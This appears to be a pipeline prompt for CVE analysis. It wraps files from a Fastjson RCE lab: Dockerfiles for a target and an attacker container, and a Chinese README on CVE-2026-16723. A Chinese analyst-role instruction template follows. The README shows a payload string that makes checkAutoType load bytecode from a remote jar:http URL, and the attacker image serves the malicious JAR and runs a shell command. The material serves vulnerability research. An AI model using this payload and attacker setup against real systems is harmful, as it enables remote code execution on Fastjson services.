y-success/fastjson-rce-lab.git .\n\n# 用 Maven 构建 fat-JAR（跳过测试）\nRUN mvn clean package -DskipTests -q\n\n# ============================================================\n# Stage 2: 运行镜像（最小化）\n# ============================================================\nFROM eclipse-temurin:8-jdk\n\nWORKDIR /app\n\n# 从构建阶段拷贝 fat-JAR\nCOPY --from=builder /build/target/fastjson-rce-lab.jar /app/fastjson-rce-lab.jar\n\nEXPOSE 18080 5005\n\n# JVM 参数说明：\n#   -agentlib:jdwp=...       开启远程调试，监听 5005 端口\n#   -Xmx256m -Xms64m         适配低内存 Docker 环境\n#   -XX:+UseSerialGC          减少内存开销\n#   --server.port=18080       命令行指定端口（优先级最高）\nCMD [\"java\", \\\n     \"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005\", \\\n     \"-Xmx256m\", \"-Xms64m\", \"-XX:MaxMetaspaceSize=128m\", \"-XX:+UseSerialGC\", \\\n     \"-jar\", \"/app/fastjson-rce-lab.jar\", \\\n     \"--server.port=18080\"]\n\n\n---\n/tmp/978a3a8f4e4e3513fd3a98f1c5098aa5/Dockerfile.attacker\n---\n# ============================================================\n# 攻击者容器：生成恶意 @JSONType JAR 并通过 HTTP 托管\n# ============================================================\nFROM eclipse-temurin:8-jdk\n\nRUN apt-get update \\\n    && apt-get install -y python3 --no-install-recommends \\\n    && rm -rf /var/lib/apt/lists/*\n\nWORKDIR /opt\n\n# 下载 ASM 库（字节码操作）\nADD https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar /opt/asm.jar\n\n# 拷贝攻击者源码和启动脚本\nCOPY attacker/Gen.java /opt/Gen.java\nCOPY attacker/entrypoint.sh /opt/entrypoint.sh\nRUN chmod +x /opt/entrypoint.sh\n\nEXPOSE 8000\n\n# 默认命令：touch /tmp/pwned（可通过环境变量 RCE_CMD 覆盖）\nENV RCE_CMD=\"touch /tmp/pwned\"\nENTRYPOINT [\"/opt/entrypoint.sh\"]\nCMD [\"touch /tmp/pwned\"]\n\n\n---\n/tmp/978a3a8f4e4e3513fd3a98f1c5098aa5/README.md\n---\n> **免责声明**：本项目仅供授权环境下的安全研究和学习使用。禁止对未授权系统进行测试，使用后果由使用者自行承担。\n\n---\n\n# Fastjson 1.2.83 远程代码执行漏洞分析（CVE-2026-16723）\n\n> CVSS 9.0，影响 Fastjson 1.2.68 ~ 1.2.83。无需开启 AutoType，无需第三方 Gadget，默认配置即可利用。\n\n---\n\n## 一、漏洞机制概述\n\n漏洞的入口在 `com.alibaba.fastjson.parser.ParserConfig.checkAutoType`。无论调用的是 `JSON.parse(body)` 还是 `JSON.parseObject(body, Foo.class)`，最终都会进入这个方法。\n\n关键代码路径（fastjson 1.2.83）：\n\n```java\npublic Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {\n\n    // ① 黑白名单检查——autoTypeSupport=false 时整段跳过\n    if (autoTypeSupport || expectClassFlag) { ... }\n\n    // ② @JSONType 注解探测——无条件执行\n    boolean jsonType = false;\n    InputStream is = null;\n    try {\n        String resource = typeName.replace('.', '/') + \".class\";\n        if (defaultClassLoader != null) {\n            is = defaultClassLoader.getResourceAsStream(resource);\n        } else {\n            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);\n        }\n        if (is != null) {\n            ClassReader classReader = new ClassReader(is, true);\n            TypeCollector visitor = new TypeCollector(\"<clinit>\", new Class[0]);\n            classReader.accept(visitor);\n            jsonType = visitor.hasJsonType();\n        }\n    } catch (Exception e) { /* 静默吞掉 */ }\n      finally { IOUtils.close(is); }\n\n    // ③ 类型加载\n    if (autoTypeSupport || jsonType || expectClassFlag) {\n        boolean cacheClass = autoTypeSupport || jsonType;\n        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);\n    }\n\n    // ④ 短路返回——jsonType=true 时跳过所有后续检查\n    if (clazz != null) {\n        if (jsonType) {\n            return clazz;\n        }\n        // denyList 检查、硬编码拦截、isAssignableFrom ...\n    }\n}\n```\n\nAutoType 开关（`autoTypeSupport`）只控制 ① 是否进入，但 ② 注解探测无条件执行。只要 ② 中 `jsonType` 变为 `true`，③ 类型加载和 ④ 安全检查跳过就会相继触发。\n\n---\n\n## 二、攻击链路逐段分析\n\n### 2.1 typeName → resource\n\n```java\nString resource = typeName.replace('.', '/') + \".class\";\n```\n\n`typeName` 是 JSON 中 `@type` 的值，攻击者完全可控。本意是将 `com.example.Foo` 转为 `com/example/Foo.class`，但当输入是 URL 时，这就变成了 URL 构造器。\n\n因为 hostname 中的 `.` 也会被替换，攻击者用整数 IP 来绕过。`127.0.0.1` 的 32 位无符号整数是 `2130706433`：\n\n```\n输入:  jar:http:..2130706433:8000.probe!.EvilPayload\n ↓ replace('.', '/')\n输出:  jar:http://2130706433:8000/probe!/EvilPayload.class\n```\n\n`..` → `//`，`.probe!` → `/probe!/`，得到一个合法的 `jar:http://` 资源定位符。\n\n### 2.2 getResourceAsStream\n\n```java\nis = defaultClassLoader.getResourceAsStream(resource);\n```\n\n`getResourceAsStream` 能否把 `jar:http://` 解析为远程资源，完全取决于 ClassLoader 类型：\n\n| ClassLoader | 行为 |\n|---|---|\n| JDK `AppClassLoader` | 只搜本地 classpath → null |\n| Tomcat `WebappClassLoader`（独立 WAR） | 只搜 `WEB-INF/lib` → null |\n| Spring Boot `LaunchedURLClassLoader`（fat-JAR） | 支持 `jar:http://` → HTTP 出去拉字节码 |\n\n这里有一个容易混淆的点：Spring Boot 内嵌 Tomcat 时，应用类的 ClassLoader 是 `LaunchedURLClassLoader` 而**不是** `WebappClassLoader`。所以内嵌 Tomcat/Jetty/Undertow 都在受影响范围内。\n\n当 `is != nul\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n#